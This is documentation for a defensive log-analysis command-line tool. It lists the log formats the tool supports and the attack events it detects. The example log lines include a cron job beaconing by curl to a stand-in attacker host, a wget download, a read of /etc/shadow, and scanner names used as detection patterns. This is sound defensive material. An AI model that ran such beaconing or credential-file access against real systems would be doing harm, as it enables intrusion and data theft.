# Supported Log Formats

Pass the format key via `--fmt` when running `ais analyze`.

---

## `auth_log` — `/var/log/auth.log`

The primary SSH and PAM authentication log on Debian/Ubuntu systems.

**Covers:**

| Event type | Example |
|---|---|
| Failed Login | `Failed password for root from 1.2.3.4 port 22` |
| Invalid User | `Invalid user hacker from 1.2.3.4 port 22` |
| Accepted Password | `Accepted password for admin from 1.2.3.4 port 22` |
| Accepted Publickey | `Accepted publickey for deploy from 1.2.3.4` |
| Session Opened/Closed | `pam_unix(sshd:session): session opened for user admin` |
| Sudo Command | `sudo: admin : COMMAND=/bin/bash` |
| Auth Failure | `pam_unix(sshd:auth): authentication failure` |

```bash
ais analyze /var/log/auth.log --fmt auth_log
```

---

## `syslog` — `/var/log/syslog`

General system event log. Useful for detecting defense evasion (service stops) and persistence (cron, systemd).

**Covers:**

| Event type | Example |
|---|---|
| Service Started/Stopped/Failed | `systemd: Started/Stopped OpenSSH Server` |
| Cron Execution | `CRON: (root) CMD (curl http://attacker.com/beacon)` |
| OOM Kill | `kernel: Out of memory: Kill process` |
| USB Connected | `kernel: usb 1-1: new USB device found` |

```bash
ais analyze /var/log/syslog --fmt syslog
```

---

## `audit_log` — `/var/log/audit/audit.log`

Linux audit daemon log. High-fidelity process execution and credential access telemetry.

**Covers:**

| Event type | Example |
|---|---|
| Process Execution | `type=EXECVE a0="wget" a1="http://..."` |
| Shell Execution | `type=SYSCALL comm="bash"` |
| File Access | `type=OPEN name="/etc/shadow"` |
| Audit Auth Failure | `type=USER_AUTH res=failed` |
| Audit Login | `type=USER_LOGIN res=success` |

```bash
ais analyze /var/log/audit/audit.log --fmt audit_log
```

---

## `web_access` — `/var/log/nginx/access.log`

Nginx (and compatible Apache) access logs. Detects web attacks, scanning, and web shells.

**Covers:**

| Event type | Detection logic |
|---|---|
| Web Shell | POST to `.php`/`.asp`/`.jsp` returning `200` |
| Web Attack | SQLi/XSS/traversal patterns in URI |
| Web Scan | Rapid sequential 404s across paths |
| Tool Fingerprint | `sqlmap`, `nikto`, `masscan` in User-Agent |
| Admin Access | Requests to `/admin`, `/wp-admin`, `/.env` |

```bash
ais analyze /var/log/nginx/access.log --fmt web_access
```

---

## `sysmon_linux` — Linux Sysmon XML

Microsoft Sysmon for Linux output (one `<Event>` block per line). High-fidelity endpoint telemetry.

**Covers:**

| Sysmon EventID | Event type |
|---|---|
| 1 | Process Created |
| 3 | Network Connection |
| 11 | File Created |
| 23 | File Deleted |
| 5 | Process Terminated *(skipped — noise)* |

```bash
ais analyze /var/log/sysmon.xml --fmt sysmon_linux
```

---

## Combining formats

Run `ais analyze` once per log file, then correlate across the generated reports. Multi-source correlation into a single campaign view is on the [Phase 3 roadmap](https://github.com/lironabraham/cyber-incident-storyteller).
